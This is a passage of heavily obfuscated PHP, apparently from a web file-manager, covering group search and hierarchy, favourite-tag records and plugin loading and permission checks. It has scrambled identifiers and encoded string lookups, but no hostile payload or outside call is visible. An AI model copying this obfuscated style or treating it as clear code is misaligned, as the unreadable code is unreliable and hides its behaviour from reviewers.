$ù‰¶°Ÿ = $¸††ä [$À÷‹”à¦[588]] . $Û¶ßËïÒ . $À÷‹”à¦[620]; $¨ÌìĞ‘ò = array($¨ÌìĞ‘ò, array($À÷‹”à¦[588] => array($À÷‹”à¦[461], $ù‰¶°Ÿ))); } $¨ÌìĞ‘ò = $this->parseWhereLike($¨ÌìĞ‘ò); $àôªÒòù = $this->_makeOrder()->where($¨ÌìĞ‘ò)->selectPage(20); $àôªÒòù = $àôªÒòù ? $àôªÒòù : array($À÷‹”à¦[447] => array(), $À÷‹”à¦[444] => array()); if (!$àôªÒòù || count($àôªÒòù[$À÷‹”à¦[447]]) < 5 && Input::check($©ï·¢—, $À÷‹”à¦[395])) { $‰¥¬æ£ = $this->groupChildrenAll($Û¶ßËïÒ); $·ğ–‡í = $this->_searchFromMeta($À÷‹”à¦[539], $©ï·¢—, 10, $‰¥¬æ£); $³ÈÉú„» = $this->_searchFromMeta($À÷‹”à¦[540], $©ï·¢—, 10, $‰¥¬æ£); $êÕ‹ıê = array_merge($·ğ–‡í, $³ÈÉú„», $àôªÒòù[$À÷‹”à¦[447]]); $àôªÒòù[$À÷‹”à¦[447]] = array_unique_by_key($êÕ‹ıê, $À÷‹”à¦[1996]); $àôªÒòù[$À÷‹”à¦[444]][$À÷‹”à¦[445]] = count($àôªÒòù[$À÷‹”à¦[447]]); $àôªÒòù[$À÷‹”à¦[444]][$À÷‹”à¦[446]] = ceil($àôªÒòù[$À÷‹”à¦[444]][$À÷‹”à¦[445]] / $àôªÒòù[$À÷‹”à¦[444]][$À÷‹”à¦[441]]); } $this->_listDataApply($àôªÒòù[$À÷‹”à¦[447]]); return $àôªÒòù; } protected function groupChildrenAll($¨Ñäğ¤Š) { $ÁËˆ•§Ó =& $_SERVER[™¸œØ®Ü]; if (!$¨Ñäğ¤Š) { return !1; } if (!is_array($¨Ñäğ¤Š)) { $¨Ñäğ¤Š = array($¨Ñäğ¤Š); } $ø›¥Àú˜ = $¨Ñäğ¤Š; foreach ($¨Ñäğ¤Š as $‘ôòä) { $ŒåÊ½ÚØ = $this->getInfoSimple($‘ôòä); $²ÈüÇ›Õ = array($ÁËˆ•§Ó[588] => array($ÁËˆ•§Ó[461], $ŒåÊ½ÚØ[$ÁËˆ•§Ó[588]] . $‘ôòä . $ÁËˆ•§Ó[620])); $×ìšúøÈ = $this->field($ÁËˆ•§Ó[1996])->where($²ÈüÇ›Õ)->select(); $ø›¥Àú˜ = array_merge($ø›¥Àú˜, array_to_keyvalue($×ìšúøÈ, $ÁËˆ•§Ó[12], $ÁËˆ•§Ó[1996])); } return array_unique($ø›¥Àú˜); } private function _searchFromMeta($¾šÙùÉ, $ÕºâÛÁ, $Í©¿¯ªİ, $¿É’§’ˆ) { $™ß Ş =& $_SERVER[™¸œØ®Ü]; $ÕºâÛÁ = strtolower($ÕºâÛÁ); $µ±Î”® = array($™ß Ş[97] => $¾šÙùÉ, $™ß Ş[452] => array($™ß Ş[461], "\x25{$ÕºâÛÁ}\x25")); $µ±Î”® = $this->parseWhereLike($µ±Î”®); if ($¿É’§’ˆ) { $µ±Î”®[$™ß Ş[1996]] = array($™ß Ş[7], $¿É’§’ˆ); } $ºãš¤Ä£ = Model($™ß Ş[2099])->where($µ±Î”®)->limit($Í©¿¯ªİ)->select(); if (!$ºãš¤Ä£) { return array(); } $ºãš¤Ä£ = array_to_keyvalue($ºãš¤Ä£, $™ß Ş[12], $™ß Ş[1996]); $§È³İ—· = $this->where(array($™ß Ş[2088] => array($™ß Ş[7], $ºãš¤Ä£)))->select(); if (!$§È³İ—·) { return array(); } return $§È³İ—·; } protected function _listDataApplyItem($—ûúÙÉ¯) { $ÃÈãÚåˆ = array($—ûúÙÉ¯); $this->_listDataApply($ÃÈãÚåˆ); return $ÃÈãÚåˆ[0]; } protected function _listDataApply(&$üÕ˜ãü°) { $ŞŞš¶®— =& $_SERVER[™¸œØ®Ü]; if (!$üÕ˜ãü°) { return; } $ÑÔøˆû‹ = array_to_keyvalue($üÕ˜ãü°, $ŞŞš¶®—[12], $ŞŞš¶®—[1996]); $this->_listAppendChildren($üÕ˜ãü°); $this->_listAppendChildrenMember($üÕ˜ãü°); $this->_listAppendMeta($üÕ˜ãü°, $ÑÔøˆû‹); $this->_listAppendParent($üÕ˜ãü°); $this->_listAppendSourceRoot($üÕ˜ãü°, $ÑÔøˆû‹); } private function _listAppendChildren(&$«¾¸‚¯) { $Í¡ğ¹â¡ =& $_SERVER[™¸œØ®Ü]; $˜±ú¹‚Õ = array_to_keyvalue($«¾¸‚¯, $Í¡ğ¹â¡[12], $Í¡ğ¹â¡[1996]); $ó’Áß¸¢ = array($Í¡ğ¹â¡[192] => array($Í¡ğ¹â¡[7], $˜±ú¹‚Õ)); $¹ëĞ¡ôä = array($Í¡ğ¹â¡[192], $Í¡ğ¹â¡[2100] => $Í¡ğ¹â¡[569]); $ÎòéÈÅû = $this->field($¹ëĞ¡ôä)->where($ó’Áß¸¢)->group($Í¡ğ¹â¡[192])->select(); $íÌÒÕğ¨ = array_to_keyvalue($ÎòéÈÅû, $Í¡ğ¹â¡[192], $Í¡ğ¹â¡[569]); foreach ($«¾¸‚¯ as &$ÓÊÕÑ©ã) { $àÚé÷Åâ = $ÓÊÕÑ©ã[$Í¡ğ¹â¡[1996]]; $ÓÊÕÑ©ã[$Í¡ğ¹â¡[2101]] = isset($íÌÒÕğ¨[$àÚé÷Åâ]) ? intval($íÌÒÕğ¨[$àÚé÷Åâ]) : !1; } unset($ÓÊÕÑ©ã); } private function _listAppendChildrenMember(&$ûèğ¶Õ€) { $ñ¨å©« =& $_SERVER[™¸œØ®Ü]; $¹ƒôˆ² = array_to_keyvalue($ûèğ¶Õ€, $ñ¨å©«[12], $ñ¨å©«[1996]); $Ï•×²¿Ğ = array($ñ¨å©«[1996] => array($ñ¨å©«[7], $¹ƒôˆ²)); $˜•ä¯°Î = array($ñ¨å©«[1996], $ñ¨å©«[2100] => $ñ¨å©«[569]); $şĞãÈ = Model($ñ¨å©«[2090])->field($˜•ä¯°Î)->where($Ï•×²¿Ğ)->group($ñ¨å©«[1996])->select(); $ĞèˆÌ = array_to_keyvalue($şĞãÈ, $ñ¨å©«[1996], $ñ¨å©«[569]); foreach ($ûèğ¶Õ€ as &$¶•ìÁÂé) { $¤Œ•áç° = $¶•ìÁÂé[$ñ¨å©«[1996]]; $¶•ìÁÂé[$ñ¨å©«[2102]] = isset($ĞèˆÌ[$¤Œ•áç°]) ? intval($ĞèˆÌ[$¤Œ•áç°]) : !1; } unset($¶•ìÁÂé); } private function _listAppendMeta(&$«š¨ôÔ¶, $ş¥òøÎõ) { $öÖæ¨ã =& $_SERVER[™¸œØ®Ü]; $üö—â  = array($öÖæ¨ã[1996] => array($öÖæ¨ã[7], $ş¥òøÎõ)); $•Ÿ›ôæ = Model($öÖæ¨ã[2089])->where($üö—â )->select(); $•Ÿ›ôæ = array_to_keyvalue_group($•Ÿ›ôæ, $öÖæ¨ã[1996]); foreach ($•Ÿ›ôæ as &$ñÉì»¥) { $ñÉì»¥ = array_to_keyvalue($ñÉì»¥, $öÖæ¨ã[97], $öÖæ¨ã[452]); } unset($ñÉì»¥); foreach ($«š¨ôÔ¶ as &$á­ ÄüË) { $á­ ÄüË[$öÖæ¨ã[543]] = array(); if (isset($•Ÿ›ôæ[$á­ ÄüË[$öÖæ¨ã[1996]]])) { $á­ ÄüË[$öÖæ¨ã[543]] = $•Ÿ›ôæ[$á­ ÄüË[$öÖæ¨ã[1996]]]; } } unset($á­ ÄüË); } protected function parentLevelArray($ö£ù±¹Ô) { $¿Æ®¸ƒÎ =& $_SERVER[™¸œØ®Ü]; $ö£ù±¹Ô = explode($¿Æ®¸ƒÎ[50], trim($ö£ù±¹Ô, $¿Æ®¸ƒÎ[50])); $ö£ù±¹Ô = array_remove_value($ö£ù±¹Ô, $¿Æ®¸ƒÎ[230]); return $ö£ù±¹Ô; } protected function parentInGroup($Ø—÷ı†ˆ, $ƒëóİüÚ) { $Èò’½Ø =& $_SERVER[™¸œØ®Ü]; $›ïÜ­˜¼ = $this->getInfoSimple($Ø—÷ı†ˆ); if (!$›ïÜ­˜¼) { return !0; } $Éóè×Ê³ = $this->parentLevelArray($›ïÜ­˜¼[$Èò’½Ø[588]]); $Éóè×Ê³[] = $Ø—÷ı†ˆ; foreach ($Éóè×Ê³ as $Ø—÷ı†ˆ) { if (in_array($Ø—÷ı†ˆ . $Èò’½Ø[12], $ƒëóİüÚ)) { return !0; } } return !1; } private function _listAppendParent(&$…àÙÖí ) { $ŠşÜ˜ÚÖ =& $_SERVER[™¸œØ®Ü]; $Ã«¡øğ‘ = array(); foreach ($…àÙÖí  as &$ÅıøúÜ¢) { $Ã«¡øğ‘[$ÅıøúÜ¢[$ŠşÜ˜ÚÖ[1996]]] = $ÅıøúÜ¢[$ŠşÜ˜ÚÖ[32]]; $™„¦ÎÍõ = $this->parentLevelArray($ÅıøúÜ¢[$ŠşÜ˜ÚÖ[588]]); foreach ($™„¦ÎÍõ as $§·™İæå) { if (!isset($Ã«¡øğ‘[$§·™İæå])) { $Ã«¡øğ‘[$§·™İæå] = 0; } } } unset($ÅıøúÜ¢); foreach ($Ã«¡øğ‘ as $Ú°£ÄÆò => $×Í™•±€) { if ($×Í™•±€) { continue; } $¬•—œ‚à = $this->getInfoSimple($Ú°£ÄÆò); $Ã«¡øğ‘[$Ú°£ÄÆò] = $¬•—œ‚à[$ŠşÜ˜ÚÖ[32]]; } $Ùâø¹‚ = $GLOBALS[$ŠşÜ˜ÚÖ[6]][$ŠşÜ˜ÚÖ[92]][$ŠşÜ˜ÚÖ[2103]]; if (KodUser::isRoot()) { $Ùâø¹‚ = !1; } foreach ($…àÙÖí  as &$ÅıøúÜ¢) { $™„¦ÎÍõ = $this->parentLevelArray($ÅıøúÜ¢[$ŠşÜ˜ÚÖ[588]]); $óÃéß¦¿ = $ŠşÜ˜ÚÖ[12]; foreach ($™„¦ÎÍõ as $Ú°£ÄÆò => $§·™İæå) { if ($Ùâø¹‚ && $Ú°£ÄÆò == 0) { continue; } $óÃéß¦¿ .= $Ã«¡øğ‘[$§·™İæå] . $ŠşÜ˜ÚÖ[8]; } if ($™„¦ÎÍõ) { $óÃéß¦¿ .= $ÅıøúÜ¢[$ŠşÜ˜ÚÖ[32]]; } $ÅıøúÜ¢[$ŠşÜ˜ÚÖ[593]] = str_replace($ŠşÜ˜ÚÖ[256], $ŠşÜ˜ÚÖ[8], $óÃéß¦¿); } unset($ÅıøúÜ¢); } private function _listAppendSourceRoot(&$‹›ô¸Ò, $á„ØËÂÕ) { $†Æ‹ÏÀ‡ =& $_SERVER[™¸œØ®Ü]; $ïÂ¸ÍõÛ = Model($†Æ‹ÏÀ‡[915])->listSourceRoot(SourceModel::TYPE_GROUP, $á„ØËÂÕ); $ïÂ¸ÍõÛ = array_to_keyvalue($ïÂ¸ÍõÛ, $†Æ‹ÏÀ‡[573]); $ïÂ¸ÍõÛ = array_remove_key($ïÂ¸ÍõÛ, $†Æ‹ÏÀ‡[573]); foreach ($‹›ô¸Ò as &$®Š‡ÆÔ) { $®Š‡ÆÔ[$†Æ‹ÏÀ‡[90]] = $ïÂ¸ÍõÛ[$®Š‡ÆÔ[$†Æ‹ÏÀ‡[1996]]] ? $ïÂ¸ÍõÛ[$®Š‡ÆÔ[$†Æ‹ÏÀ‡[1996]]] : array(); } unset($®Š‡ÆÔ); } protected function groupMerge($Ó›ßºÉ“) { $Ó›ßºÉ“ = array_values(array_unique($Ó›ßºÉ“)); $ÚÃÛ¢¹› = array(); for ($ãÑîÌ© = 0; $ãÑîÌ© < count($Ó›ßºÉ“); $ãÑîÌ©++) { $£Õ¡óß = !1; for ($°“‘ù«³ = 0; $°“‘ù«³ < count($Ó›ßºÉ“); $°“‘ù«³++) { if ($ãÑîÌ© == $°“‘ù«³) { continue; } if ($this->isParentOf($Ó›ßºÉ“[$°“‘ù«³], $Ó›ßºÉ“[$ãÑîÌ©])) { $£Õ¡óß = !0; break; } } if (!$£Õ¡óß) { $ÚÃÛ¢¹›[] = $Ó›ßºÉ“[$ãÑîÌ©]; } } return $ÚÃÛ¢¹›; } protected function isParentOf($²Ÿ—Üş¹, $˜„ó­¢’) { $×»Òù Á =& $_SERVER[™¸œØ®Ü]; if (!$²Ÿ—Üş¹ || !$˜„ó­¢’ || $²Ÿ—Üş¹ == $˜„ó­¢’) { return !1; } $•˜²Ø’¤ = $this->getInfoSimple($²Ÿ—Üş¹); $×µºÖ¢ê = $this->getInfoSimple($˜„ó­¢’); $Öü™«ç = $•˜²Ø’¤[$×»Òù Á[588]] . $²Ÿ—Üş¹ . $×»Òù Á[50]; if (substr($×µºÖ¢ê[$×»Òù Á[588]], 0, strlen($Öü™«ç)) == $Öü™«ç) { return !0; } return !1; } public function groupShowRoot($¸Ë©š, $–»ÕèÕ = false) { $œûÎß­Â =& $_SERVER[™¸œØ®Ü]; $ñ¬ğšü“ = $this->getInfo($¸Ë©š); if (!$ñ¬ğšü“) { return array(); } $êúÅó• = $this->parentLevelArray($ñ¬ğšü“[$œûÎß­Â[588]]); $ÇÄÒûïê = array($¸Ë©š); if (count($êúÅó•) == 0) { return $ÇÄÒûïê; } if ($–»ÕèÕ && count($êúÅó•) == 1) { return $ÇÄÒûïê; } if (!$ñ¬ğšü“[$œûÎß­Â[543]] || !isset($ñ¬ğšü“[$œûÎß­Â[543]][$œûÎß­Â[2086]]) || $ñ¬ğšü“[$œûÎß­Â[543]][$œûÎß­Â[2086]] == $œûÎß­Â[861]) { return $this->groupShowRoot($êúÅó•[count($êúÅó•) - 1], $–»ÕèÕ); } if ($ñ¬ğšü“[$œûÎß­Â[543]][$œûÎß­Â[2086]] == $œûÎß­Â[434]) { $µÏù±ÙÈ = explode($œûÎß­Â[50], $ñ¬ğšü“[$œûÎß­Â[543]][$œûÎß­Â[2087]]); if ($µÏù±ÙÈ) { $ÇÄÒûïê = array_merge($ÇÄÒûïê, $µÏù±ÙÈ); } } return $ÇÄÒûïê; } protected function resetParentLevel() { $»‡‹ñõˆ =& $_SERVER[™¸œØ®Ü]; $¶ÕÆÂõ± = $»‡‹ñõˆ[1996]; $æ‹¹Ç†½ = $this->select(); $æ‹¹Ç†½ = array_to_keyvalue($æ‹¹Ç†½, $¶ÕÆÂõ±); foreach ($æ‹¹Ç†½ as $¤á›¿Ş) { $¬”Á·© = $¤á›¿Ş; $í°”¦Øì = array(); while ($¬”Á·©[$»‡‹ñõˆ[192]] != 0) { $í°”¦Øì[] = $¬”Á·©[$»‡‹ñõˆ[192]]; $¬”Á·© = $æ‹¹Ç†½[$¬”Á·©[$»‡‹ñõˆ[192]]]; } $í°”¦Øì[] = 0; $í°”¦Øì = $»‡‹ñõˆ[50] . implode($»‡‹ñõˆ[50], array_reverse($í°”¦Øì)) . $»‡‹ñõˆ[50]; $this->setNamePinyin($¤á›¿Ş[$¶ÕÆÂõ±], $¤á›¿Ş[$»‡‹ñõˆ[32]]); $this->where(array($¶ÕÆÂõ± => $¤á›¿Ş[$¶ÕÆÂõ±]))->save(array($»‡‹ñõˆ[659] => $í°”¦Øì)); } return $æ‹¹Ç†½; } public function groupNameAuto($šˆ…ùóá, $ˆÛÍœ¯¥) { $±óÎõîÅ =& $_SERVER[™¸œØ®Ü]; $øİÍ¹Ã = $this->where(array($±óÎõîÅ[479] => $šˆ…ùóá))->getField($±óÎõîÅ[32], !0); if (!$øİÍ¹Ã || !in_array($ˆÛÍœ¯¥, $øİÍ¹Ã)) { return $ˆÛÍœ¯¥; } for ($Ïóœâ•Ù = 1; $Ïóœâ•Ù <= count($øİÍ¹Ã) + 1; $Ïóœâ•Ù++) { $¬¸€À½‚ = $ˆÛÍœ¯¥ . "\50{$Ïóœâ•Ù}\51"; if (!in_array($¬¸€À½‚, $øİÍ¹Ã)) { return $¬¸€À½‚; } } } public function groupSwitch($È¯ÛôÓŸ, $á·ÁÎâ­) { $ú·“Ô¢Ô =& $_SERVER[™¸œØ®Ü]; $ÖË½éÁÜ = array($ú·“Ô¢Ô[1996] => array($ú·“Ô¢Ô[7], array($È¯ÛôÓŸ, $á·ÁÎâ­))); $ëô¬…å¿ = $this->where($ÖË½éÁÜ)->select(); $ëô¬…å¿ = array_to_keyvalue($ëô¬…å¿, $ú·“Ô¢Ô[1996]); if (!isset($ëô¬…å¿[$È¯ÛôÓŸ]) || !isset($ëô¬…å¿[$á·ÁÎâ­]) || $ëô¬…å¿[$È¯ÛôÓŸ][$ú·“Ô¢Ô[192]] == 0) { return !1; } $ÖË½éÁÜ = array($ú·“Ô¢Ô[1996] => $È¯ÛôÓŸ); $Ù‘Ñº¿Õ = Model($ú·“Ô¢Ô[2090])->where($ÖË½éÁÜ)->select(); if (!$Ù‘Ñº¿Õ) { $Ù‘Ñº¿Õ = array(); } foreach ($Ù‘Ñº¿Õ as $¯§†¤ï) { $ì–†¹€ = $¯§†¤ï[$ú·“Ô¢Ô[1795]]; $ÖË½éÁÜ = array($ú·“Ô¢Ô[1795] => $ì–†¹€, $ú·“Ô¢Ô[1996] => $á·ÁÎâ­); $şÅåÅ ¡ = Model($ú·“Ô¢Ô[2090])->where($ÖË½éÁÜ)->find(); if (!$şÅåÅ ¡) { $÷òœşì = array($á·ÁÎâ­ => $¯§†¤ï[$ú·“Ô¢Ô[2104]]); Model($ú·“Ô¢Ô[601])->userGroupAdd($ì–†¹€, $÷òœşì); } Model($ú·“Ô¢Ô[601])->userGroupRemove($ì–†¹€, $È¯ÛôÓŸ); } $ÖË½éÁÜ = array($ú·“Ô¢Ô[190] => 2, $ú·“Ô¢Ô[192] => 0, $ú·“Ô¢Ô[487] => 1, $ú·“Ô¢Ô[573] => array($ú·“Ô¢Ô[7], array($È¯ÛôÓŸ, $á·ÁÎâ­))); $¡çÌïØ¯ = Model($ú·“Ô¢Ô[915])->where($ÖË½éÁÜ)->field($ú·“Ô¢Ô[2105])->select(); $¡çÌïØ¯ = array_to_keyvalue($¡çÌïØ¯, $ú·“Ô¢Ô[573], $ú·“Ô¢Ô[193]); $İ¬ßçÏ = !empty($¡çÌïØ¯[$È¯ÛôÓŸ]) ? $¡çÌïØ¯[$È¯ÛôÓŸ] : !1; if ($İ¬ßçÏ) { if (!$¡çÌïØ¯[$á·ÁÎâ­]) { $¡çÌïØ¯[$á·ÁÎâ­] = Model($ú·“Ô¢Ô[915])->groupRootAdd($á·ÁÎâ­); } $¸åÓ£ ¹ = $¡çÌïØ¯[$á·ÁÎâ­]; $ÖË½éÁÜ = array($ú·“Ô¢Ô[192] => $İ¬ßçÏ); $¡çÌïØ¯ = Model($ú·“Ô¢Ô[915])->where($ÖË½éÁÜ)->field($ú·“Ô¢Ô[2106])->select(); if (!$¡çÌïØ¯) { $¡çÌïØ¯ = array(); } Model($ú·“Ô¢Ô[915])->moveClearAuth = !1; foreach ($¡çÌïØ¯ as $­†Áëµ€) { $ïÈÃÛñ› = $­†Áëµ€[$ú·“Ô¢Ô[487]] == $ú·“Ô¢Ô[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ú·“Ô¢Ô[915])->move($­†Áëµ€[$ú·“Ô¢Ô[193]], $¸åÓ£ ¹, $ïÈÃÛñ›); } Model($ú·“Ô¢Ô[915])->moveClearAuth = !0; $ÖË½éÁÜ = array($ú·“Ô¢Ô[190] => 2, $ú·“Ô¢Ô[573] => $È¯ÛôÓŸ); $ì‘Š…à¨ = array($ú·“Ô¢Ô[573] => $á·ÁÎâ­); Model($ú·“Ô¢Ô[2107])->where($ÖË½éÁÜ)->save($ì‘Š…à¨); Model($ú·“Ô¢Ô[2108])->where($ÖË½éÁÜ)->save($ì‘Š…à¨); } $this->_changeChildLevel($ëô¬…å¿[$È¯ÛôÓŸ], $ëô¬…å¿[$á·ÁÎâ­], !0); $this->where(array($ú·“Ô¢Ô[192] => $È¯ÛôÓŸ))->save(array($ú·“Ô¢Ô[192] => $á·ÁÎâ­)); $this->_clearChildrenCache($ëô¬…å¿[$á·ÁÎâ­]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($û’ŠÔ ) { $ØœÓÓø =& $_SERVER[™¸œØ®Ü]; return array($ØœÓÓø[2109] => array($û’ŠÔ [0], $ØœÓÓø[2110]), $ØœÓÓø[2111] => array($û’ŠÔ [0], $ØœÓÓø[2112])); } protected function get($ö‹†äÏ) { $—èÖÚ»õ =& $_SERVER[™¸œØ®Ü]; $ÎçÌ˜Ì = Model($—èÖÚ»õ[589])->metaGet($ö‹†äÏ, $—èÖÚ»õ[2113]); $ìıßºŞ = json_decode($ÎçÌ˜Ì, !0); return $ìıßºŞ ? $ìıßºŞ : array($—èÖÚ»õ[2114] => $—èÖÚ»õ[91], $—èÖÚ»õ[447] => array()); } protected function set($§ç¬öıÂ, $£ó¸àïÔ) { $ÄÉŞü½÷ =& $_SERVER[™¸œØ®Ü]; $£ó¸àïÔ = $£ó¸àïÔ ? $£ó¸àïÔ : array($ÄÉŞü½÷[2114] => $ÄÉŞü½÷[91], $ÄÉŞü½÷[447] => array()); return Model($ÄÉŞü½÷[589])->metaSet($§ç¬öıÂ, $ÄÉŞü½÷[2113], json_encode($£ó¸àïÔ)); } protected function getByTagID($†ƒ¾÷ñì, $†Ö˜ßäè) { $ñÔêÏÍ­ =& $_SERVER[™¸œØ®Ü]; if (!$†ƒ¾÷ñì || !$†Ö˜ßäè) { return !1; } if (!Model($ñÔêÏÍ­[589])->getInfoSimple($†ƒ¾÷ñì)) { return !1; } $ÀîÄ„É = $this->get($†ƒ¾÷ñì); if (!$ÀîÄ„É || !isset($ÀîÄ„É[$ñÔêÏÍ­[447]])) { return !1; } $Û¸ãïÙ¾ = array_find_by_field($ÀîÄ„É[$ñÔêÏÍ­[447]], $ñÔêÏÍ­[477], $†Ö˜ßäè); return is_array($Û¸ãïÙ¾) ? $Û¸ãïÙ¾ : !1; } public function listSource($ˆùïß”§, $§ªï‡…Œ) { $›·¨û½ =& $_SERVER[™¸œØ®Ü]; if ($§ªï‡…Œ && !is_array($§ªï‡…Œ)) { $§ªï‡…Œ = array($§ªï‡…Œ); } $¨Éõ ­Ï = $this->listData($ˆùïß”§); $™îÕçÖ¼ = array(); foreach ($¨Éõ ­Ï as $ìçâË) { $Åâ¿¸Ï† = $ìçâË[$›·¨û½[87]]; if (!$Åâ¿¸Ï†) { continue; } if (!isset($™îÕçÖ¼[$Åâ¿¸Ï†])) { $™îÕçÖ¼[$Åâ¿¸Ï†] = array(); } $™îÕçÖ¼[$Åâ¿¸Ï†][] = $ìçâË[$›·¨û½[502]]; } $“”¶˜¾° = array(); foreach ($™îÕçÖ¼ as $ùœˆ«¿ => $–Ó×ğŸº) { $Ï¯à£Äå = !0; if (!$§ªï‡…Œ) { $“”¶˜¾°[] = $ùœˆ«¿; continue; } foreach ($§ªï‡…Œ as $è§‘ ÇÉ) { if (!in_array($è§‘ ÇÉ, $–Ó×ğŸº)) { $Ï¯à£Äå = !1; break; } } if ($Ï¯à£Äå) { $“”¶˜¾°[] = $ùœˆ«¿; } } if (!$“”¶˜¾°) { return array(); } $Íõñ«ÙÏ = array($›·¨û½[493] => array($›·¨û½[494], $“”¶˜¾°), $›·¨û½[573] => $ˆùïß”§, $›·¨û½[190] => SourceModel::TYPE_GROUP); $Ô õ•ú = Model($›·¨û½[1440])->listSource($Íõñ«ÙÏ); if (!$Ô õ•ú || count($“”¶˜¾°) == $Ô õ•ú[$›·¨û½[444]][$›·¨û½[445]]) { return $Ô õ•ú; } $Ú‹ îÚ = array(); $Ê·…©áƒ = array_to_keyvalue($Ô õ•ú[$›·¨û½[85]], $›·¨û½[12], $›·¨û½[193]); $¤ù§ü‡ñ = array_to_keyvalue($Ô õ•ú[$›·¨û½[86]], $›·¨û½[12], $›·¨û½[193]); $«½Ãœ = array_merge($¤ù§ü‡ñ, $Ê·…©áƒ); foreach ($“”¶˜¾° as $Åâ¿¸Ï†) { if (!in_array($Åâ¿¸Ï†, $«½Ãœ)) { $Ú‹ îÚ[] = $Åâ¿¸Ï†; } } if ($Ú‹ îÚ) { $this->removeBySource($ˆùïß”§, $Ú‹ îÚ); } return $Ô õ•ú; } protected function listData($®¬ûšÜ‰) { $å±”İ—ï =& $_SERVER[™¸œØ®Ü]; $ŒâÁûûï = array($å±”İ—ï[1786] => 0, $å±”İ—ï[561] => array($å±”İ—ï[2115], 0), $å±”İ—ï[498] => $å±”İ—ï[2116] . $®¬ûšÜ‰); $‡‚“Ñ = $å±”İ—ï[2117]; $°˜»¯–° = $this->field($‡‚“Ñ)->where($ŒâÁûûï)->order($å±”İ—ï[2118])->select(); return $°˜»¯–° ? $°˜»¯–° : array(); } protected function addToTag($±ÂÒ¬¥û, $ù¸‚åÌô, $ºˆûî”¬) { $—Ë»Ìşñ =& $_SERVER[™¸œØ®Ü]; if (!$this->getByTagID($±ÂÒ¬¥û, $ºˆûî”¬) || !$ù¸‚åÌô) { return !1; } if (!Model($—Ë»Ìşñ[915])->pathInfo($ù¸‚åÌô)) { return !1; } $­ÙÔì = array($—Ë»Ìşñ[1786] => 0, $—Ë»Ìşñ[561] => $ºˆûî”¬, $—Ë»Ìşñ[497] => $ù¸‚åÌô, $—Ë»Ìşñ[498] => $—Ë»Ìşñ[2119] . $±ÂÒ¬¥û, $—Ë»Ìşñ[496] => $—Ë»Ìşñ[12], $—Ë»Ìşñ[2000] => 0); if ($this->where($­ÙÔì)->find()) { return !1; } return $this->add($­ÙÔì); } protected function removeFromTag($†ĞÍÓ‹, $àî…ÇŠ, $ÃÕœ¸‚) { $âÛ‡¶’Á =& $_SERVER[™¸œØ®Ü]; if (!$this->getByTagID($†ĞÍÓ‹, $ÃÕœ¸‚) || !$àî…ÇŠ) { return !1; } if (is_array($àî…ÇŠ)) { $àî…ÇŠ = array($âÛ‡¶’Á[7], $àî…ÇŠ); } $¿’±»œ = array($âÛ‡¶’Á[1786] => 0, $âÛ‡¶’Á[561] => $ÃÕœ¸‚, $âÛ‡¶’Á[498] => $âÛ‡¶’Á[2119] . $†ĞÍÓ‹, $âÛ‡¶’Á[497] => $àî…ÇŠ); return $this->where($¿’±»œ)->delete(); } protected function removeByTag($ì®¶ïé˜, $ §·™×é) { $îÏìïù¨ =& $_SERVER[™¸œØ®Ü]; if (!$this->getByTagID($ì®¶ïé˜, $ §·™×é)) { return !1; } $­ù†Äö = array($îÏìïù¨[1786] => 0, $îÏìïù¨[561] => $ §·™×é, $îÏìïù¨[498] => $îÏìïù¨[2119] . $ì®¶ïé˜); return $this->where($­ù†Äö)->delete(); } protected function removeBySource($Å€²î³, $„¹–“øİ) { $ºçßÍÊå =& $_SERVER[™¸œØ®Ü]; if (!$Å€²î³ || !$„¹–“øİ) { return !1; } if (is_array($„¹–“øİ)) { $„¹–“øİ = array($ºçßÍÊå[7], $„¹–“øİ); } $‡¸£¾÷Œ = array($ºçßÍÊå[1786] => 0, $ºçßÍÊå[497] => $„¹–“øİ, $ºçßÍÊå[561] => array($ºçßÍÊå[1110], 0), $ºçßÍÊå[498] => $ºçßÍÊå[2119] . $Å€²î³); return $this->where($‡¸£¾÷Œ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x70\154\x75\147\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\x74\x61\x74\x75\163", "\162\145\147\x69\x65\163\164", "\143\157\156\146\151\147"); public function loadList($ğÅ¹„úÍ = false) { $ÕÇôäÉü = array_to_keyvalue($this->listData(), $_SERVER[™¸œØ®Ü][32]); if ($ğÅ¹„úÍ) { return $ÕÇôäÉü[$ğÅ¹„úÍ]; } return $ÕÇôäÉü; } public function init() { $´½©ïšñ =& $_SERVER[™¸œØ®Ü]; Hook::trigger($´½©ïšñ[2120]); $Üßûò´ò = $this->loadPluginList(); foreach ($Üßûò´ò as $¿ãéìŸ‚ => $²ìïšÅÃ) { $‘†ŒÜİó = $this->appAllow($¿ãéìŸ‚, $²ìïšÅÃ); if (!$‘†ŒÜİó) { continue; } foreach ($²ìïšÅÃ[$´½©ïšñ[2121]] as $‡‡®ßß¶ => $Ã¨îÊßÒ) { Hook::bind($‡‡®ßß¶, $Ã¨îÊßÒ); } } Hook::trigger($´½©ïšñ[2122]); Hook::trigger(ACTION); } public function appAllow($ÄïĞ©Ò³, $æÎ¦¶ÃÙ, $çª‡ò†Å = true) { $ã·±²µ =& $_SERVER[™¸œØ®Ü]; $œß¤¢ó = PLUGIN_DIR . $ÄïĞ©Ò³ . $ã·±²µ[2123]; if (!is_array($æÎ¦¶ÃÙ) || !is_array($æÎ¦¶ÃÙ[$ã·±²µ[2121]]) || $æÎ¦¶ÃÙ[$ã·±²µ[835]] != 1 || !is_file($œß¤¢ó)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ã·±²µ[6]][$ã·±²µ[2124]] || !$GLOBALS[$ã·±²µ[6]][$ã·±²µ[2125]]) { return !0; } $ÇˆäêÅ´ = explode($ã·±²µ[50], strtolower($GLOBALS[$ã·±²µ[6]][$ã·±²µ[2125]])); return in_array(strtolower($ÄïĞ©Ò³), $ÇˆäêÅ´) ? !1 : !0; } if ($çª‡ò†Å && !Action($ã·±²µ[2126])->checkAuth($ÄïĞ©Ò³)) { return !1; } return !0; } public function unInstall($……Äğšß) { $¨ø‰ºá— =& $_SERVER[™¸œØ®Ü]; $ÁÈôò¥Ü = $this->loadList($……Äğšß); if (file_exists(PLUGIN_DIR . $……Äğšß)) { Hook::apply($……Äğšß . $¨ø‰ºá—[2127]); } $this->remove($ÁÈôò¥Ü[$¨ø‰ºá—[477]]); } public function 